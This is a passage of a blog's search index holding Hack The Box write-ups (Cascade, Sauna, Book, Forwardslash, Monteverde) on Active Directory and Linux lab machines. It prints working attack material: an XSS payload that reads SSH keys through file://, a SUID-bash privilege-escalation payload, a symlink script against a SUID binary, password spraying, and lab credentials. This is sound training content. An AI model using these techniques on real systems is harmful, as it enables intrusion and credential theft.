doesn’t seem to to be anything accessible on SMB at the moment with our guest user or a null session.User enumerationAnonymous LDAP bind sessions are allowed on this domain controller so any unauthenticated user can retrieve the user and group list from the DC. The first thing I did was list only the sAMAccountName attributes to see if there any accounts name that contain adm, svc or any other string that might indicate a potentially high privilege account.There’s a arksvc and BackupSvc account in there. Service accounts are a juicy target because they often hold elevated privileges in the domain. In real life, some products don’t provide proper documentation about the minimum rights required by their service accounts so domain admins will sometimes put service accounts in the “Domain Admins” group. Combined with a weak password policy this can provide a quick way to DA.Next we’ll look at the full attributes list of the users to see if there’s any custom attribute added or credentials that might have been added in a description field or something like that. Here we see that the r.thompson user has a custom attribute cascadeLegacyPwd with a base64 encoded string.The base64 value appears to contain the plaintext password value.We can validate the credentials by using crackmapexec and we see that the credentials are valid.SMB share enumeration and s.smith user escalationUser r.thompson can’t log in with WinRM but has read-only access to a Data share. We can mount the CIFS filesystem so it’ll be easier to look around, grep files, etc.We’ll look for credentials by searching for files that contain password. Because this is a Windows machine, some of the files may be using UTF-16 encoding so if we just use the standard Linux grep program there’s a good chance we might miss some stuff. Instead I’ll use Powershell for Linux and it’ll automatically scan for both UTF-8 and UTF-16 encoded strings when using the Select-String function.We found two things here: The first is an email with the minutes from a meeting in 2018 with a TempAdmin account. The email says the password is the same as the normal admin account but we don’t have it. The second hit is an encrypted VNC password for user s.smith.VNC password are encrypted with a modified DES cipher and a static key. One tool we can use is https://github.com/jeroennijhof/vncpwd. We just need to take the hex values and write them in binary format to a file that can be read by the decrypt tool.We’ll use Crackmapexec again to check the credentials for user s.smith. We can see here that we have access to an Audit$ share we couldn’t previously access.That user is a member of the Remote Management Users group so we can log in remotely with WinRM.Finding the password for ArkSvc inside SQlite databaseInside the Audit$ share we find an Audit database and a CascAudit.exe file.The executable is a .NET assembly (which means we can probably easily reverse it with DNSpy) and the DB file is an SQLite database.To read the database file, we’ll use the sqlite3 client then issue the .tables command to view the list of tables. The Ldap table contains a base64 value for what we can safely assume to be the ArkSvc account password.Unfortunately the password appears to be encryped since we only get binary data after base64 decoding it.With DNSpy it’s easy to reverse the application CascAudit.exe that we found on the share. We can see here that it’s using AES in CBS mode with an hardcoded Key and IV.To decrypt the password from the SQlite database I’ll use Cyberchef.Finally, we’ll use Crackmapexec again to verify that the credentials are valid:PrivescArksvc can log in with WinRM and can see he’s a member of the AD Recycle Bin group.This is pretty interesting because Active Directory keeps a copy of old deleted objects. Our user has access to view deleted objects. As mentionned in the meeting notes we found earlier on the Data share, there was at some point a TempAdmin user created for migration purposes. We can look for that old account with RSAT and by adding the -IncludeDeletedObjects flag to the command.Next, we’ll look at the attributes of the deleted account and we see that it also has a cascadeLegacyPwd attribute like the first account we found on the machine.We’ll decode the password and remembering the meeting notes, it says the TempAdmin password was the same as the regular admin password so we can just use Evil-WinRM to log in as Administrator and get the root flag."
  },
  
  {
    "title": "Sauna - Hack The Box",
    "url": "/posts/htb-writeup-sauna/",
    "categories": "hackthebox, infosec",
    "tags": "ad, asrep, kerbrute, crackmapexec, powerview, dcsync, secretsdump",
    "date": "2020-07-18 00:00:00 +0800",
    





    
    "snippet": "Sauna is a good beginner-friendly AD box that covers a few key Windows exploitation topics like AS-REP roasting, enumeration for credentials, using tools such as Powerview to find attack paths, DCs...",
    "content": "Sauna is a good beginner-friendly AD box that covers a few key Windows exploitation topics like AS-REP roasting, enumeration for credentials, using tools such as Powerview to find attack paths, DCsync and Pass-The-Hash techniques.Summary  Find a list of valid users with kerbrute  Pre-auth is disabled on the fsmith account so we can get his password hash and crack it offline  svc_loanmgr’s credentials are in the WinLogon registry key  Using PowerView’s ACL scanner, we find that svc_loanmgr can DCsync  Using the administrator hash we can log in with psexecPortscanUsers enumerationCrackmapexec is a good tool to do a quick initial recon and find what the domain name is, the operating system and if there are any non-default SMB shares accessible. Aside from the OS version and the domain name, I can’t get any other information yet from CME.Some Active Directory machines on Hack the Box are configured so an anonymous bind session can enumerate users and groups from the box. I tried searching with windapsearch.py but I didn’t get any results back so anonymous bind sessions can’t dump the user list here.A good way to look for valid users on a domain controller is to use a tool like kerbrute with a wordlist containing popular usernames. This kerbrute github page explains how the user enumeration works:  To enumerate usernames, Kerbrute sends TGT requests with no pre-authentication. If the KDC responds with a PRINCIPAL UNKNOWN error, the username does not exist. However, if the KDC prompts for pre-authentication, we know the username exists and we move on. This does not cause any login failures so it will not lock out any accounts.I used a pretty big username wordlist for this one but kerbrute is very fast and since you don’t do a full authentication with the DC you can enumerate the users in a decent amount of time.So we got the default administrator user on this machine as well as fsmith and hsmith.What I could have done better: In hindsight I really messed up my enumeration of the users on the box. Instead of running a massive user wordlist I should have built a small list of possible user names based on names found on the website.Getting credentials for fsmithOne common way to get password hashes we can crack offline in an Active Directory domain is using the Kerberoasting technique. This requires the users to have an SPN associated with their account. On this box, the two users don’t have any SPNs configured but we can still get password hashes to crack offline using the AS-REP roasting. In a nutshell, if an account has Kerberoast Pre-Authentication disabled we can get the hash (just like kerberoasting).For more details, check out Harmj0y’s blog post about this topc: https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/We can use Impacket to execute this attack and we can see that we’re able to get the password hash for user fsmith.Hashcat and John both support this hash format. Here I used hashcat with the following command line options: hashcat --force -a 0 -m 18200 -w 3 -O hash.txt /usr/share/wordlists/rockyou.txtNow that we have the password, we can try to log in with WinRM.WinLogon credentialsTo look for priv esc vectors I used the https://github.com/itm4n/PrivescCheck Powershell script. With Evil-WinRM you can pass the directory containing the script with the -s flag then load the script in memory by calling the PS1 file, no need to drop anything on disk.The privesc script found credentials for the svc_loanmanager user in the WinLogon registry key.Administrator accessAfter logging in with the svc_loanmanager user we can disable AMSI and then load Powerview to do further recon with our new user.Here, I’ve used the Invoke-AclScanner function which checks for interesting rights on objects in the domain. As we can see in the output, the svc_loanmgr user has ExtendedRight rights on the domain object, which basically allows that user to perform a DCsync on the domain and get a list of all the NTLM hashes. Another way to see the attack path would be to use the Sharphound ingestor then load the data in Bloodhound.A good easy way to DCsync is to use the secretsdump tool from the Impacket suite.Now that we have the administrator hash, we can Pass-The-Hash with psexec and get a SYSTEM shell."
  },
  
  {
    "title": "Book - Hack The Box",
    "url": "/posts/htb-writeup-book/",
    "categories": "hackthebox, infosec",
    "tags": "xss, pdf, ssh keys, logrotate, cronjob, bash_completion.d",
    "date": "2020-07-11 00:00:00 +0800",
    





    
    "snippet": "I initially thought for Book that the goal was to get the administrator’s session cookie via an XSS but instead we have to create a duplicate admin account by using a long email address that gets t...",
    "content": "I initially thought for Book that the goal was to get the administrator’s session cookie via an XSS but instead we have to create a duplicate admin account by using a long email address that gets truncated to the existing one. Once we have access to the admin page we then exploit an XSS vulnerability in the PDF generator to read SSH keys for the low priv user. We priv esc using a race condition vulnerability in logrotate so we can backdoor /etc/bash_completion.d.Summary  Create an admin account with an arbitrary password by exploiting a flaw in the web application code  Read /home/reader/.ssh/id_rsa files by using an XSS in the PDF creator  Exploit logrotate vulnerability to gain root accessPortscanWebsite reconWe have a login page on the website with a link to sign up and create a new account. The forgot password link is not functional (it points to /index.php#).After running gobuster we see that we have an /admin directory. We can’t access it yet because we’re not authorized (after creating a regular user account with still can’t access it because we’re not admin).We’ll create ourselves an account with Name: Snow and Email: snow@test.com then we’re able to log to the site. The site is a web application with collections of books where people can submit books and leave feedback.The book listing contains the book title, author and download links.There’s a Search page where you can look up books by title or author.The Feedback section could be interesting since the message says the feedback sent will reviewed by an administrator. If there’s an XSS vulnerability in the application then we could steal the session cookie from the admin.Under the Collections page we have the option to upload a book. The book isn’t updated right away on the site though since an administrator must review the submission first.Lastly we have an option to contact the administrator. That’s one other potential XSS vector we could try to exploit.I couldn’t find any exploitable vulnerabilities on the feedback/contact forms, neither could I find a SQL injection or an insecure upload vulnerability. So let’s go back to the authentication page and try to find a way to log in as administrator.Access to the admin pageThe javascript validation on the sign up page contains the max length for both name and email fields.&lt;script&gt;  if (document.location.search.match(/type=embed/gi)) {    window.parent.postMessage(\"resize\", \"*\");  }function validateForm() {  var x = document.forms[\"myForm\"][\"name\"].value;  var y = document.forms[\"myForm\"][\"email\"].value;  if (x == \"\") {    alert(\"Please fill name field. Should not be more than 10 characters\");    return false;  }  if (y == \"\") {    alert(\"Please fill email field. Should not be more than 20 characters\");    return false;  }}&lt;/script&gt;We can exceed the name or email field length and the extra characters get truncated. For example, if we create a user name longer than 10 character we can log in with the email address and when we check the profile page we see the name has been truncated to 10 characters.POST request: name=1234567890abcdef&amp;email=a@a.com&amp;password=1234The same thing happens with the email field.POST request: name=b&amp;email=b@12345678901234567890ab.com&amp;password=123We can reset the administrator’s password by creating a new user with admin as the username and an email address of admin@book.htb. Of course, we can’t just create the account like that because the user already exists. So the trick here is to send an email address padded with spaces at the end and add an extra character at the end so it’ll get truncated. We need the extra character at the end because the application first strips whitespace at the end of string.POST request: name=admin&amp;email=admin@book.htb++++++a&amp;password=1234After I rooted the box I looked at the MySQL database and it doesn’t actually reset the admin’s password but it creates a new user with the same name and email address:mysql&gt; select * from users;+------------+----------------------+-------------------+| name       | email                | password          |+------------+----------------------+-------------------+| admin      | admin@book.htb       | Sup3r_S3cur3_P455 || test       | a@b.com              | test              || shaunwhort | test@test.com        | casablancas1      || peter      | hi@hello.com         | password          || admin      | admin@book.htb       | 1234              |+------------+----------------------+-------------------+We can now log in with admin@book.htb / 1234.Under the Users we can see a bunch of users already created, plus our new user.The javascript payloads I sent earlier during some of my test are escaped properly and doesn’t pop the alert window.With the Collections menu we can generate a PDF file with the list of books or users.There’s an XSS however in the PDF generator: when we submit a new book, the title and author fields are not escaped correctly and the PDF generator will execute our payload. We can turn the XSS into an arbitrary file read by using the file:// URI handler. First, we’ll get the /etc/passwd file to get a list of users on the box:Now that we have the username of a user with a login shell we can try to look for his SSH private key:We have access to his SSH private key but I’m missing some of the output on the right because of the default font used.One way to fix this is to add a &lt;pre&gt; HTML tag to our payload: &lt;script&gt;x=new XMLHttpRequest;x.onload=function(){document.write(\"&lt;pre&gt;\"+this.responseText+\"&lt;/pre&gt;\")};x.open(\"GET\",\"file:///home/reader/.ssh/id_rsa\");x.send();&lt;/script&gt;Now that looks much better:With the SSH key we can log in with user reader.PrivescWe’ll use pspy to check processes that are running on the box and we see that logrotate runs every 5 seconds which is highly unusual.The backups directory has an access.log file that get rotated every few seconds whenever we write to it.The version of logrotate running on the box is vulnerable to a race condition that will allow us to write a file to any directory since logrotate is running as root.Exploit: https://github.com/whotwagner/logrottenFor the payload, we can use anything really so I’ll make bash SUID instead of popping a reverse shell.#!/bin/shchmod u+s /bin/bashThe exploit is triggered after we write to the log file. There’s a cron job running as root on the machine to clean up some files so the payload will get executed by the root user.Cronjob contents from /var/spool/cron/crontabs/root:@reboot /root/reset.sh* * * * * /root/cron_root*/5 * * * * rm /etc/bash_completion.d/*.log**/2 * * * * /root/clean.shAfter a minute or two, the root user logs it and the access.log script in /etc/bash_completion.d is executed and the SUID bit is set on /bin/bash:"
  },
  
  {
    "title": "Forwardslash - Hack The Box",
    "url": "/posts/htb-writeup-forwardslash/",
    "categories": "hackthebox, infosec",
    "tags": "php, vhosts, ssrf, ltrace, python, unintended, luks",
    "date": "2020-07-04 00:00:00 +0800",
    





    
    "snippet": "Forwardslash starts off like most classic Hack The Box machines with some enumeration of vhosts, files and directories with gobuster then we use a Server-Side Request Forgery (SSRF) vulnerability t...",
    "content": "Forwardslash starts off like most classic Hack The Box machines with some enumeration of vhosts, files and directories with gobuster then we use a Server-Side Request Forgery (SSRF) vulnerability to reach a protected dev directory only accessible from localhost. After finding credentials and getting a shell, we’ll analyze and exploit a small backup program to read files as user pain and find more credentials. In the spirit of Team Unintended, instead of solving the crypto challenge to get root I used the sudo commands available to me to upload and mount my own Luks container and execute a SUID bash binary.Summary  Find the backup vhost, create an account and log in to the dashboard  Enumerate the backup vhost with gobuster, find a /dev directory that only allows connections from localhost  Use the disabled change profile picture page to do an SSRF and access the /dev directory, finding the chiv user password  SSH in as user chiv, reverse a backup utitity and write a script to compute the expected MD5 hash, gaining arbitrary file read as user pain  Find the password for user pain in /var/backups/config.php.bak  Gain root the unintended way by using the sudo luksOpen and mount commands to mount a volume where a SUID /bin/bash binary has been placedPortscanroot@kali:~/htb/forwardslash# nmap -sC -sV -p- 10.10.10.183Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-05 07:42 EDTNmap scan report for forwardslash.htb (10.10.10.183)Host is up (0.016s latency).Not shown: 65533 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 3c:3b:eb:54:96:81:1d:da:d7:96:c7:0f:b4:7e:e1:cf (RSA)|   256 f6:b3:5f:a2:59:e3:1e:57:35:36:c3:fe:5e:3d:1f:66 (ECDSA)|_  256 1b:de:b8:07:35:e8:18:2c:19:d8:cc:dd:77:9c:f2:5e (ED25519)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Backslash GangService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWebsiteWhen we browse the website with its IP address, it redirects us to forwardslash.htb so I will add this domain name to my local host file and use the hostname instead.HTTP/1.1 302 FoundDate: Sun, 05 Apr 2020 11:48:05 GMTServer: Apache/2.4.29 (Ubuntu)Location: http://forwardslash.htbOh oh… The website has been defaced by the infamous The Backslash Gang. I don’t see any links or any html comments that might indicate what to do next and I have no idea who that Sharon person referenced on the website is.Since the website is using the hostname (not just the IP address), it’s worth looking for additional vhosts. I’ll use gobuster for this and discover that there is a vhost for backup.forwardslash.htb:root@kali:~/htb/forwardslash# gobuster vhost -q -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -u http://forwardslash.htbFound: backup.forwardslash.htb (Status: 302) [Size: 33]The backup page has a login screen with a link to create an account.Once logged in, we see a dashboard with a couple of options:At first glance they’re not that interesting, but I’ll get back to the Change Profile Picture one in just a minute…After running gobuster on that vhost we find a /dev directory.root@kali:~/htb/forwardslash# gobuster dir -q -w ~/tools/SecLists/Discovery/Web-Content/big.txt -t 50 -u http://backup.forwardslash.htb/.htaccess (Status: 403)/.htpasswd (Status: 403)/dev (Status: 301)/server-status (Status: 403)I get a 403 when I access this directory but my IP address is shown on the error message so this may be some kind of hint that the page can only be accessed locally (this hints at using an SSRF vulnerability to access the page).Back to the dashboard options,  I see the option to change the profile picture is disabled (the URL bar and submit button are greyed out).These options are just disabled client-side with the disabled HTML tag:&lt;form action=\"/profilepicture.php\" method=\"post\"&gt;        URL:        &lt;input type=\"text\" name=\"url\" disabled style=\"width:600px\"&gt;&lt;br&gt;        &lt;input style=\"width:200px\" type=\"submit\" value=\"Submit\" disabled&gt;&lt;/form&gt;Using Burp, I’ll send the POST query directly and discover after messing around in the Repeater tab that there’s an SSRF vulnerability on the page that lets me read files with the URL parameter or make HTTP requests. The first thing I tested was reading an arbitrary file like the /etc/passwd.From the /etc/passwd file, I have found two users: chiv and painRemember that /dev page we couldn’t access from our box? By using the http URI handler in the the url parameter we can send requests orginated from localhost and get around the IP restriction, reaching some kind of API test page.url=http://backup.forwardslash.htb/devI couldn’t figure out what to do with this API but I found that I could retrieve the PHP source code the /dev/index.php file by base64 encoding it with a PHP filter.The PHP code contains the password for user chiv for the FTP login function:if (@ftp_login($conn_id, \"chiv\", 'N0bodyL1kesBack/')) {    error_log(\"Getting file\");    echo ftp_get_string($conn_id, \"debug.txt\");}We can log in with SSH with user chiv and this password:Escalating to user painI ran linpeas to check for privilege escalation vectors.The /usr/bin/backup binary is owned by user pain and has the SUID bit set so that’s the next logical step on the box.chiv@forwardslash:~$ ls -l /usr/bin/backup-r-sr-xr-x 1 pain pain 13384 Mar  6 10:06 /usr/bin/backupThe program is weird, it tries to access a different random file every time I run it.chiv@forwardslash:~$ /usr/bin/backup----------------------------------------------------------------------\tPain's Next-Gen Time Based Backup Viewer\tv0.1\tNOTE: not reading the right file yet, \tonly works if backup is taken in same second----------------------------------------------------------------------Current Time: 12:17:34ERROR: 6de241f3320ade5ac8bb6e1d245a1457 Does Not Exist or Is Not Accessible By Me, Exiting...I used ltrace to figure out what the program does.The program takes the time and computes an MD5 hash based from it, then tries to access a file with the MD5 name.To confirm this, I’ll take the time from the previous output (12:17:34 / 6de241f3320ade5ac8bb6e1d245a1457) and compute the MD5 hash.chiv@forwardslash:~$ echo -ne '12:17:34' | md5sum6de241f3320ade5ac8bb6e1d245a1457  -Good, the hash matches so we know that random file name is just a hash of the current time. So to exploit this program, I just need to generate a symlink to the file I want to read using the MD5 hash of the current time. Since the program runs as pain, I’ll be able to read any files owned by this user.#!/usr/bin/pythonimport hashlibimport osimport sysfrom time import gmtime, strftimea = str(strftime(\"%H:%M:%S\"))print am = hashlib.md5()m.update(a)print os.symlink(sys.argv[1], m.hexdigest())print os.system('/usr/bin/backup')I can now read any file with user pain privileges:After looking around, I found the /var/backups/config.php.bak file containing pain’s password: db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704I can log in as pain now:Privesc to root unintended wayThere’s a note in pain’s home directory that gives a hint about the next step.pain@forwardslash:~$ cat note.txt Pain, even though they got into our server, I made sure to encrypt any important files and then did some crypto magic on the key... I gave you the key in person the other day, so unless these hackers are some crypto experts we should be good to go.-chivRunning sudo shows there’s a few commands we can run as root like opening and mounting an encryted Luks volume.pain@forwardslash:~$ sudo -lMatching Defaults entries for pain on forwardslash:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser pain may run the following commands on forwardslash:    (root) NOPASSWD: /sbin/cryptsetup luksOpen *    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/    (root) NOPASSWD: /bin/umount ./mnt/As we can see here, the encrypted backup is located here in /var/backups/recovery/.pain@forwardslash:~$ ls -l /var/backups/recovery/total 976568-rw-r----- 1 root backupoperator 1000000000 Mar 24 12:12 encrypted_backup.imgThe encrypter.py script is some crypto challenge that we have to solve to recover the Luks volume encryption key.I didn’t feel like solving a crypto challenge that weekend so I chose an unintended route to solve this one. Since we can open and mount Luks containers there’s nothing stopping us from mounting a volume with an arbitrary program placed into it. The attributes set on the program files will also be used by the operating system so if we make something SUID like bash for example, then we’ll be able to escalate root privileges easily.Step 1. First, we’ll create an empty virtual disk# dd if=/dev/zero of=luksvolume1 bs=1M count=6464+0 records in64+0 records out67108864 bytes (67 MB, 64 MiB) copied, 0.0982699 s, 683 MB/sStep 2. Then we format &amp; encrypt it with LUKS (we pick an arbitrary password)# cryptsetup -vy luksFormat luksvolume1WARNING!========This will overwrite data on luksvolume1 irrevocably.Are you sure? (Type 'yes' in capital letters): YESEnter passphrase for luksvolume1: Verify passphrase: Key slot 0 created.Command successful.Step 3. Next, we open the new encrypted container# cryptsetup luksOpen luksvolume1 myluksvol1Enter passphrase for luksvolume1: Step 4. And create the ext4 filesystem on it# mkfs.ext4 /dev/mapper/myluksvol1mke2fs 1.45.6 (20-Mar-2020)Creating filesystem with 49152 1k blocks and 12288 inodesFilesystem UUID: d4482c0c-1970-4956-9ffa-8b8105f19cddSuperblock backups stored on blocks: \t8193, 24577, 40961Allocating group tables: done                            Writing inode tables: done                            Creating journal (4096 blocks): doneWriting superblocks and filesystem accounting information: doneStep 5. Then we mount it, then copy bash to it and set the SUID bit# mount /dev/mapper/myluksvol1 /mnt# cp bash /mnt# chmod u+s /mnt/bash# ls -l /mnttotal 1100-rwsr-xr-x 1 root root 1113504 Apr  5 08:39 bashdrwx------ 2 root root   12288 Apr  5 08:38 lost+found# umount /mntStep 6. We then copy the container image to the boxroot@kali:~/htb/forwardslash# scp luksvolume1 pain@10.10.10.183:/tmppain@10.10.10.183's password: luksvolume1Step 7. And finally mount the image and execute bash as root"
  },
  
  {
    "title": "Monteverde - Hack The Box",
    "url": "/posts/htb-writeup-monteverde/",
    "categories": "hackthebox, infosec",
    "tags": "ad, password spray, azure ad, crackmapexec, plaintext creds, winrm",
    "date": "2020-06-12 00:00:00 +0800",
    





    
    "snippet": "Monteverde was an Active Directory box on the easier side that requires enumerating user accounts then password spraying to get an initial shell. Then we find more credentials looking around the bo...",
    "content": "Monteverde was an Active Directory box on the easier side that requires enumerating user accounts then password spraying to get an initial shell. Then we find more credentials looking around the box and eventually find the MSOL account password which we use to get administrator access.Summary  Get the list of users and groups from a null session on the domain controller  Use crackmapexec to spray credentials, find an account that uses the username as the password  Find an Azure XML file with a plaintext password from a PSADPasswordCredential object  Log in with the credentials, find and decrypt the password for the MSOL account  Log in as administrator with the MSOL account passwordPortscanroot@kali:~/htb/monteverde# nmap -sC -sV -p- 10.10.10.172Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-12 08:09 ESTNmap scan report for monteverde.htb (10.10.10.172)Host is up (0.022s latency).Not shown: 65516 filtered portsPORT      STATE SERVICE       VERSION53/tcp    open  domain?| fingerprint-strings: |   DNSVersionBindReqTCP: |     version|_    bind88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-01-12 13:22:26Z)135/tcp   open  msrpc         Microsoft Windows RPC139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)445/tcp   open  microsoft-ds?464/tcp   open  kpasswd5?593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0636/tcp   open  tcpwrapped3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)3269/tcp  open  tcpwrapped5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp  open  mc-nmf        .NET Message Framing49667/tcp open  msrpc         Microsoft Windows RPC49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.049670/tcp open  msrpc         Microsoft Windows RPC49671/tcp open  msrpc         Microsoft Windows RPC49706/tcp open  msrpc         Microsoft Windows RPC49775/tcp open  msrpc         Microsoft Windows RPCListing users and groups in ADWith RPC client we can pull the list of users and groups (null sessions are allowed):root@kali:~# rpcclient -U \"\" -N 10.10.10.172rpcclient $&gt; enumdomusersuser:[Guest] rid:[0x1f5]user:[AAD_987d7f2f57d2] rid:[0x450]user:[mhope] rid:[0x641]user:[SABatchJobs] rid:[0xa2a]user:[svc-ata] rid:[0xa2b]user:[svc-bexec] rid:[0xa2c]user:[svc-netapp] rid:[0xa2d]user:[dgalanos] rid:[0xa35]user:[roleary] rid:[0xa36]user:[smorgan] rid:[0xa37]rpcclient $&gt; enumdomgroupsgroup:[Enterprise Read-only Domain Controllers] rid:[0x1f2]group:[Domain Users] rid:[0x201]group:[Domain Guests] rid:[0x202]group:[Domain Computers] rid:[0x203]group:[Group Policy Creator Owners] rid:[0x208]group:[Cloneable Domain Controllers] rid:[0x20a]group:[Protected Users] rid:[0x20d]group:[DnsUpdateProxy] rid:[0x44e]group:[Azure Admins] rid:[0xa29]group:[File Server Admins] rid:[0xa2e]group:[Call Recording Admins] rid:[0xa2f]group:[Reception] rid:[0xa30]group:[Operations] rid:[0xa31]group:[Trading] rid:[0xa32]group:[HelpDesk] rid:[0xa33]group:[Developers] rid:[0xa34]Observations:  There’s an Azure Admins group which is not standard by default in Windows unless the domain has been connected to Azure AD with ADSyncWe can also retrieve the same information with LDAP using a tool like ldapsearch or windapsearch:root@kali:~/tools/windapsearch# ./windapsearch.py --dc-ip 10.10.10.172 -U [+] No username provided. Will try anonymous bind.[+] Using Domain Controller at: 10.10.10.172[+] Getting defaultNamingContext from Root DSE[+]\tFound: DC=MEGABANK,DC=LOCAL[+] Attempting bind[+]\t...success! Binded as: [+]\t None[+] Enumerating all AD users[+]\tFound 10 users: cn: Guestcn: AAD_987d7f2f57d2cn: Mike HopeuserPrincipalName: mhope@MEGABANK.LOCAL[...]root@kali:~/tools/windapsearch# ./windapsearch.py --dc-ip 10.10.10.172 -G [+] No username provided. Will try anonymous bind.[+] Using Domain Controller at: 10.10.10.172[+] Getting defaultNamingContext from Root DSE[+]\tFound: DC=MEGABANK,DC=LOCAL[+] Attempting bind[+]\t...success! Binded as: [+]\t None[+] Enumerating all AD groups[+]\tFound 48 groups: distinguishedName: CN=Users,CN=Builtin,DC=MEGABANK,DC=LOCALcn: UsersdistinguishedName: CN=Guests,CN=Builtin,DC=MEGABANK,DC=LOCALcn: Guests[...]Password sprayingTo password spray, I usually start with a small wordlist then expand if I don’t find anything. Here, we’ll create a custom wordlist using the smaller rockyou list and the list of users in case some users are using their username as the password:root@kali:~/htb/monteverde# cat &lt;&lt; EOF &gt; users.txt&gt; Guest&gt; AAD_987d7f2f57d2&gt; mhope&gt; SABatchJobs&gt; svc-ata&gt; svc-bexec&gt; svc-netapp&gt; dgalanos&gt; roleary&gt; smorgan&gt; EOFroot@kali:~/htb/monteverde# cat ~/tools/SecLists/Passwords/Leaked-Databases/rockyou-10.txt &gt;&gt; users.txtThen we’ll use crackmapexec to spray the credentials. Another tool like kerbrute could also be used for this since port 88 is open.root@kali:~/htb/monteverde# cme smb 10.10.10.172 -u /root/htb/monteverde/users.txt -p /root/htb/monteverde/passwords.txt | grep -v FAILURESMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK) (signing:True) (SMBv1:False)SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK\\SABatchJobs:SABatchJobsHere we go, we got a valid account: SABatchJobs / SABatchJobsChecking shares…root@kali:~/htb/monteverde# cme smb 10.10.10.172 -u SABatchJobs -p SABatchJobs --sharesSMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK) (signing:True) (SMBv1:False)SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK\\SABatchJobs:SABatchJobs SMB         10.10.10.172    445    MONTEVERDE       [+] Enumerated sharesSMB         10.10.10.172    445    MONTEVERDE       Share           Permissions     RemarkSMB         10.10.10.172    445    MONTEVERDE       -----           -----------     ------SMB         10.10.10.172    445    MONTEVERDE       ADMIN$                          Remote AdminSMB         10.10.10.172    445    MONTEVERDE       azure_uploads   READ            SMB         10.10.10.172    445    MONTEVERDE       C$                              Default shareSMB         10.10.10.172    445    MONTEVERDE       E$                              Default shareSMB         10.10.10.172    445    MONTEVERDE       IPC$            READ            Remote IPCSMB         10.10.10.172    445    MONTEVERDE       NETLOGON        READ            Logon server share SMB         10.10.10.172    445    MONTEVERDE       SYSVOL          READ            Logon server share SMB         10.10.10.172    445    MONTEVERDE       users$          READWhile checking the home directories on the server, we find an Azure XML file with another password: 4n0therD4y@n0th3r$root@kali:~/htb/monteverde# smbclient -U SABatchJobs //10.10.10.172/Users$Enter WORKGROUP\\SABatchJobs's password: Try \"help\" to get a list of possible commands.smb: \\&gt; dir  .                                   D        0  Fri Jan  3 08:12:48 2020  ..                                  D        0  Fri Jan  3 08:12:48 2020  dgalanos                            D        0  Fri Jan  3 08:12:30 2020  mhope                               D        0  Fri Jan  3 08:41:18 2020  roleary                             D        0  Fri Jan  3 08:10:30 2020  smorgan                             D        0  Fri Jan  3 08:10:24 2020\t\t524031 blocks of size 4096. 519955 blocks availablesmb: \\&gt; cd mhopesmb: \\mhope\\&gt; dir  .                                   D        0  Fri Jan  3 08:41:18 2020  ..                                  D        0  Fri Jan  3 08:41:18 2020  azure.xml                          AR     1212  Fri Jan  3 08:40:23 2020\t\t524031 blocks of size 4096. 519955 blocks availablesmb: \\mhope\\&gt; get azure.xmlgetting file \\mhope\\azure.xml of size 1212 as azure.xml (12.9 KiloBytes/sec) (average 12.9 KiloBytes/sec)smb: \\mhope\\&gt; exitroot@kali:~/htb/monteverde# cat azure.xml��&lt;Objs Version=\"1.1.0.1\" xmlns=\"http://schemas.microsoft.com/powershell/2004/04\"&gt;  &lt;Obj RefId=\"0\"&gt;    &lt;TN RefId=\"0\"&gt;      &lt;T&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/T&gt;      &lt;T&gt;System.Object&lt;/T&gt;    &lt;/TN&gt;    &lt;ToString&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/ToString&gt;    &lt;Props&gt;      &lt;DT N=\"StartDate\"&gt;2020-01-03T05:35:00.7562298-08:00&lt;/DT&gt;      &lt;DT N=\"EndDate\"&gt;2054-01-03T05:35:00.7562298-08:00&lt;/DT&gt;      &lt;G N=\"KeyId\"&gt;00000000-0000-0000-0000-000000000000&lt;/G&gt;      &lt;S N=\"Password\"&gt;4n0therD4y@n0th3r$&lt;/S&gt;    &lt;/Props&gt;  &lt;/Obj&gt;&lt;/Objs&gt;We can now connect via WinRM to the server as user mhope:root@kali:~/htb/monteverde# evil-winrm -u mhope -p 4n0therD4y@n0th3r$ -i 10.10.10.172Evil-WinRM shell v2.0Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; type ..\\desktop\\user.txt4961976bd7[...]Privesc using the Azure AD Sync databaseRef: https://blog.xpnsec.com/azuread-connect-for-redteam/Ref2: https://aireforge.com/Tools/DotNetSqlServerConnectionStringGeneratormhope is part of the Azure Admins group:*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; net users mhope[...]Local Group Memberships      *Remote Management UseGlobal Group memberships     *Azure Admins         *Domain UsersThe command completed successfully.This group normally has the AAD_xxxxxxxxxx service account created to manage the AD Sync service. Because our user is also a member of that group he also has access to the local SQL server database which contains the encrypted password for the MSOL account.The ADsync 